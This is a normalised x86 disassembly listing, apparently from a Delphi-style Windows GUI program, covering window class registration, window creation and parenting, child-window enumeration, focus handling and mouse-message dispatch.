xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_451b4c
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_451b4c
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_451b4c
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_451b4c
mov eax ebx
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov eax edi
call sub_458904
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax ebx
call sub_451b4c
mov eax edi
call sub_4551b8
jmp r-xdata
mov edx ebx
mov eax edi
call sub_454170
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_45460c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov [ esp ] esi
mov [ esp + 0x4 ] ebx
push 0x0
mov edi esi
mov ecx edi
mov edx 0xb036
mov eax ebx
call sub_451b4c
mov eax esi
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov eax ebx
call sub_458904
test al al
je r-xdata
mov dl 0x1
mov ebp esi
mov eax ebp
call sub_454464
mov eax ebp
mov edx [ eax ]
call [ edx + 0xb0 ]
jmp r-xdata
mov edx esi
mov eax ebx
call sub_4544d0
push 0x0
mov ecx edi
mov edx 0xb02c
mov eax ebx
call sub_451b4c
push 0x0
lea ecx [ esp + 0x4 ]
mov edx 0xb04c
mov eax ebx
call sub_451b4c
mov eax ebx
call sub_45422c
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
xor ecx ecx
movzx edx [ esi + 0x57 ]
mov eax esi
call sub_450cec
sub_4546ac
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov ebp [ ebx + 0x1cc ]
test ebp ebp
je r-xdata
xor esi esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
mov edx edi
sub edx esi
mov eax [ ebx + 0x1d0 ]
call sub_419898
mov edx edi
mov eax ebp
call sub_419898
jmp r-xdata
cmp esi edi
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_454708
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
call sub_4546e8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_4546ac
mov ebp eax
mov edx esi
mov eax [ ebp + 0x3c ]
call [ ebp + 0x38 ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
sub_454748
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_44fbc0
cmp esi [ edi + 0x23c ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor eax eax
mov [ edi + 0x23c ] eax
sub_454778
add esp 0xfffffff0
movzx edx dx
mov [ esp ] edx
xor edx edx
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
call sub_454708
add esp 0x10
retn
sub_4547a0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_450f68
test al al
je r-xdata
mov eax ebx
call sub_450f98
test al al
je r-xdata
or [ edi ] 0x2000
mov eax ebx
mov si 0xffc7
call sub_40484c
test al al
je r-xdata
or [ edi ] 0x4000
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffca
call sub_40484c
test al al
jne r-xdata
mov eax ebx
mov si 0xffca
call sub_40484c
cmp al 0x1
jne r-xdata
or [ edi ] 0x1000
jmp r-xdata
or [ edi ] 0x0
sub_454808
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_454926
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor ecx ecx
mov edx 0x8c
call sub_403af4
mov eax [ esi + 0x64 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] 0x44000000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_4547a0
test [ esi + 0x50 ] 0x1
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
or [ ebx + 0x4 ] 0x2000000
or [ ebx + 0x8 ] 0x10000
cmp [ esi + 0x1d8 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ esi + 0x40 ]
mov [ ebx + 0xc ] eax
mov eax [ esi + 0x44 ]
mov [ ebx + 0x10 ] eax
mov eax [ esi + 0x48 ]
mov [ ebx + 0x14 ] eax
mov eax [ esi + 0x4c ]
mov [ ebx + 0x18 ] eax
mov edi [ esi + 0x30 ]
test edi edi
je r-xdata
or [ ebx + 0x4 ] 0x10000
or [ ebx + 0x4 ] 0x8000000
mov eax [ esi + 0x1c4 ]
mov [ ebx + 0x1c ] eax
mov eax edi
call sub_4585f8
mov [ ebx + 0x1c ] eax
jmp r-xdata
mov [ ebx + 0x24 ] 0xb
mov eax DefWindowProcA
mov [ ebx + 0x28 ] eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebx + 0x3c ] eax
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x34 ] eax
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_404530
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_405794
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4c ]
call sub_40a928
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45492d
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_454934
push ebp
mov ebp esp
add esp 0xffffff40
push ebx
push esi
xor edx edx
mov [ ebp - 0xc0 ] edx
mov esi eax
xor eax eax
push ebp
push sub_454af5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x9c ]
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ esi + 0x1a8 ] eax
lea eax [ ebp - 0xb4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test [ ebp - 0x85 ] 0x40
je r-xdata
test al al
je r-xdata
mov edx r-xdata
cmp edx [ ebp - 0xb0 ]
je r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x64 ] r-xdata
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x68 ]
push eax
call RegisterClassA
test ax ax
jne r-xdata
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call UnregisterClassA
mov [ rw-data ] esi
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xa0 ]
cmp [ esi + 0x1b4 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xb8 ] 0xb
lea eax [ ebp - 0xbc ]
push eax
push 0x0
lea edx [ ebp - 0xc0 ]
mov eax [ rw-data ]
call sub_407550
mov ecx [ ebp - 0xc0 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40db38
call sub_404ec4
test [ ebx + 0x1c ] 0x2
je r-xdata
call sub_40f26c
push 0xfffffff0
mov eax [ esi + 0x1b4 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
call sub_40f26c
mov eax ebx
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov eax [ esi + 0x64 ]
call sub_40ab08
xor eax eax
mov [ esi + 0x64 ] eax
mov eax esi
call sub_458910
push 0x1
mov eax [ esi + 0x68 ]
call sub_42473c
mov ecx eax
mov edx 0x30
mov eax esi
call sub_451b4c
cmp [ esi + 0x5c ] 0x0
je r-xdata
push 0xfffffff4
mov eax [ esi + 0x1b4 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax ebx
call sub_4585f8
mov [ ebp - 0x70 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454afc
lea eax [ ebp - 0xc0 ]
call sub_405530
retn
mov eax esi
mov si 0xffee
call sub_40484c
mov eax [ esi + 0x1b4 ]
push eax
push 0xfffffff4
push eax
call SetWindowLongA
sub_454b04
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx [ ebx ]
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_40857c
mov [ esi + 0x1b4 ] eax
pop esi
pop ebx
retn
sub_454b44
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41dcf0
mov eax esi
call sub_41dc40
mov [ ebx + 0x242 ] eax
mov eax esi
call sub_41dc40
mov [ ebx + 0x246 ] eax
or [ ebx + 0x8c ] 0x20
mov eax esi
call sub_41dcf8
pop esi
pop ebx
retn
sub_454b7c
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ ebx + 0x242 ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x246 ] eax
mov eax esi
call sub_41f5f8
mov edx [ ebx + 0x242 ]
mov eax esi
call sub_41f584
mov edx [ ebx + 0x246 ]
mov eax esi
call sub_41f584
mov eax esi
call sub_41f600
add esp 0x10
pop esi
pop ebx
retn
sub_454be4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x1cc ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + 0x242 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x242
call sub_454bd0
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x1d0 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0x1 ] 0x0
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
movzx eax [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
movzx eax [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x1cc ]
mov edx esi
call sub_419898
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x1d0 ]
mov edx esi
call sub_419898
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
sub_454cc4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4521f4
mov eax [ ebp - 0x8 ]
push eax
push sub_454b44
mov eax [ ebp - 0x8 ]
push eax
push sub_454b7c
push ebp
call sub_454be4
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_454d1f
add [ ebx + 0x56 ] dl
push edi
mov esi eax
cmp [ esi + 0x64 ] 0x0
jne r-xdata
call sub_44ef8c
mov eax esi
mov edx [ eax ]
call [ edx + 0xb4 ]
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_450804
mov ebx eax
cmp ebx 0x1
jge r-xdata
lea eax [ ebx + 0x1 ]
call sub_40aabc
mov edi eax
mov [ esi + 0x64 ] edi
mov eax edi
call sub_40aad0
mov ecx eax
mov edx edi
mov eax esi
call sub_450814
mov eax r-xdata
call sub_40aadc
mov [ esi + 0x64 ] eax
jmp r-xdata
sub_454d80
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x200
xor eax eax
push ebp
push sub_454dcd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1b4 ]
push eax
call DestroyWindow
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454dd4
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfdff
retn
call sub_40f26c
sub_454de4
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ edi + 0x1d0 ]
mov edx ebx
call sub_4198f4
mov esi eax
inc esi
mov eax [ edi + 0x1d0 ]
mov ebx [ eax + 0x8 ]
dec ebx
sub ebx esi
jl r-xdata
xor eax eax
inc ebx
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x1d0 ]
mov edx esi
call sub_419898
mov eax [ eax + 0x1b4 ]
test eax eax
jne r-xdata
sub_454e2c
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x1b4 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xa4 ]
mov esi ebx
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x1b4 ]
push eax
call SetPropA
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x1b4 ]
push eax
call SetPropA
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov eax ebx
call sub_4546e8
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
mov edx ebx
mov eax esi
call sub_454de4
push eax
mov eax [ ebx + 0x1b4 ]
push eax
call SetWindowPos
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_4546ac
call sub_44fda0
inc edi
dec esi
jne r-xdata
sub_454ec4
push ebx
cmp [ eax + 0x22a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x22c ]
call [ ebx + 0x228 ]
pop ebx
retn
sub_454ee8
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi eax
cmp [ esi + 0x232 ] 0x0
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x14
push ecx
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
mov ecx edx
mov edx eax
mov eax [ esi + 0x234 ]
call [ esi + 0x230 ]
sub_454f38
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp ebx [ esi ]
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_44d2f4
test eax eax
jne r-xdata
push 0xfffffff8
push ebx
call GetWindowLongA
cmp eax [ esi ]
jne r-xdata
push 0x0
movzx eax [ esi + 0x4 ]
push eax
push 0xb04a
push ebx
call SendMessageA
sub_454f7c
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi eax
cmp [ esi + 0x1b4 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x1d0 ]
test eax eax
je r-xdata
mov eax [ esi + 0x1b4 ]
mov [ esp ] eax
test [ esi + 0x55 ] 0x20
setne dl
mov [ esp + 0x4 ] dl
mov edx esp
push edx
push sub_454f38
push eax
call EnumChildWindows
mov eax esi
mov edx [ eax ]
call [ edx + 0xb8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
mov edx edi
mov eax [ esi + 0x1d0 ]
call sub_419898
mov edx [ eax ]
call [ edx + 0xb0 ]
inc edi
dec ebx
jne r-xdata
sub_455008
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_40484c
mov [ ebp - 0x5 ] al
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_459998
xor eax eax
push ebp
push sub_455064
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xb0 ]
mov eax [ ebp - 0x4 ]
call sub_4551b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45506b
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_459998
retn
sub_45506b
cmp [ ebp - 0x5 ] 0x0
je r-xdata
pop esi
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1b4 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1b4 ]
push eax
call SetFocus
sub_455094
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x55 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x55 ] 0x8
je r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1b4 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1b4 ] 0x0
jne r-xdata
mov al 0x1
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1da ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1d0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x98 ]
mov eax [ ebp - 0x4 ]
movzx edx [ ebp - 0x5 ]
mov [ eax + 0x1da ] dl
xor eax eax
push ebp
push sub_455190
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ ebp - 0x4 ]
call sub_451b4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1d0 ]
mov edx esi
call sub_419898
call sub_455094
inc esi
dec ebx
jne r-xdata
sub_4551b8
push ebx
push esi
mov esi eax
mov ebx esi
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
cmp [ ebx + 0x1da ] 0x0
jne r-xdata
test [ esi + 0x1c ] 0x8
jne r-xdata
mov [ esi + 0x1da ] 0x0
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4047dc
test al al
jne r-xdata
mov eax esi
call sub_455094
cmp [ ebx + 0x1c4 ] 0x0
je r-xdata
sub_455208
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0x1c4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1b4 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_459998
xor eax eax
push ebp
push sub_4552e1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xb0 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c4 ] ebx
mov eax [ ebp - 0x4 ]
call sub_4551b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_459998
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1c4 ] 0x0
je r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c4 ] ebx
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1b4 ]
push eax
call SetParent
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_4551b8
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
push 0x0
mov ecx 0x30003
mov edx 0x127
mov eax [ ebp - 0x4 ]
call sub_451b4c
sub_4552ec
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_455344
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_455333
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45533a
call sub_44ef8c
call sub_428618
retn
sub_455364
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov ebx eax
lea ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
sub eax [ ebx + 0x40 ]
call sub_418420
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax - 0xc ] edx
mov edx [ ebp - 0x8 ]
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
push [ eax - 0x8 ]
push [ eax - 0xc ]
lea edx [ ebp - 0x1c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x1c ]
push eax
call PtInRect
test eax eax
je r-xdata
xor eax eax
test [ ebx + 0x1c ] 0x10
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] ebx
cmp [ ebx + 0x57 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov al 0x1
jmp r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0xc ]
mov [ ebp - 0x4 ] ax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x8 ]
mov [ ebp - 0x2 ] ax
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb00a
mov eax ebx
call sub_451b4c
test eax eax
setne al
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xd ] 0x0
je r-xdata
sub_455430
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0xd ] cl
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x1cc ]
test eax eax
je r-xdata
cmp [ esi + 0x1d0 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x1d0 ]
mov edi [ eax + 0x8 ]
dec edi
cmp edi 0x0
jl r-xdata
mov edi [ eax + 0x8 ]
dec edi
cmp edi 0x0
jl r-xdata
test bl bl
je r-xdata
push ebp
mov edx edi
mov eax [ esi + 0x1cc ]
call sub_419898
call sub_455364
pop ecx
test al al
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x1
push 0x1
mov edx edi
mov eax [ esi + 0x1d0 ]
call sub_419898
mov edx [ ebp - 0x4 ]
movzx ecx [ ebp - 0xd ]
call sub_455430
mov [ ebp - 0x14 ] eax
dec edi
cmp edi 0xffffffff
jne r-xdata
dec edi
cmp edi 0xffffffff
jne r-xdata
push ebp
mov edx edi
mov eax [ esi + 0x1d0 ]
call sub_419898
call sub_455364
pop ecx
test al al
jne r-xdata
sub_4554f4
push ebx
push esi
push edi
add esp 0xfffffed8
mov ebx ecx
mov edi edx
mov esi eax
call GetMessagePos
call sub_40773c
mov [ esp + 0x8 ] eax
movsx eax [ esp + 0x8 ]
mov [ esp + 0xc ] eax
movsx eax [ esp + 0xa ]
mov [ esp + 0x10 ] eax
mov ecx esp
lea edx [ esp + 0xc ]
mov eax esi
call sub_4503d4
test ebx ebx
jne r-xdata
test ebx ebx
je r-xdata
push 0x0
push 0x0
lea edx [ esp + 0x8 ]
xor ecx ecx
mov eax esi
call sub_455430
mov ebx eax
xor eax eax
cmp esi ebx
je r-xdata
mov eax [ esp ]
mov [ esp + 0x114 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0x118 ] eax
mov eax [ esp ]
sub eax [ ebx + 0x40 ]
mov [ esp + 0x114 ] eax
mov eax [ esp + 0x4 ]
sub eax [ ebx + 0x44 ]
mov [ esp + 0x118 ] eax
jmp r-xdata
add eax 0xfffffdff
sub eax 0x2
jb r-xdata
add eax 0xffffff5f
sub eax 0x2
jb r-xdata
movzx eax [ edi + 0x8 ]
mov [ esp + 0x11c ] eax
mov eax [ edi + 0x4 ]
mov [ esp + 0x124 ] eax
movzx eax [ edi + 0xa ]
cmp eax 0x201
jge r-xdata
mov [ esp + 0x120 ] 0x0
jmp r-xdata
dec eax
sub eax 0x2
jb r-xdata
dec eax
sub eax 0x2
jb r-xdata
lea eax [ esp + 0x14 ]
push eax
call GetKeyboardState
lea eax [ esp + 0x14 ]
call sub_43bc90
mov [ esp + 0x121 ] al
lea eax [ esp + 0x114 ]
push eax
xor ecx ecx
mov edx 0xb04b
mov eax ebx
call sub_451b4c
mov [ edi + 0xc ] eax
mov al 0x1
jmp r-xdata
mov [ esp + 0x120 ] 0x1
jmp r-xdata
dec eax
sub eax 0x2
jb r-xdata
dec eax
sub eax 0x2
jb r-xdata
add esp 0x128
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x120 ] 0x2
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov [ esp + 0x120 ] 0x0
sub_455640
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
mov ebx eax
mov eax ebx
call sub_4585f8
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ esp + 0x8 ] eax
movsx eax [ esp + 0x8 ]
mov [ esp + 0xc ] eax
movsx eax [ esp + 0xa ]
mov [ esp + 0x10 ] eax
push 0x0
push 0x0
lea edx [ esp + 0x14 ]
xor ecx ecx
mov eax ebx
call sub_455430
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
add esp 0x18
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
sub eax [ ebx + 0x40 ]
mov [ esp ] eax
movsx eax [ esi + 0xa ]
sub eax [ ebx + 0x44 ]
mov [ esp + 0x4 ] eax
movzx eax [ esp ]
mov [ esp + 0x14 ] ax
movzx eax [ esp + 0x4 ]
mov [ esp + 0x16 ] ax
mov eax [ esp + 0x14 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_451b4c
mov [ esi + 0xc ] eax
mov al 0x1
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
xor eax eax
test ebx ebx
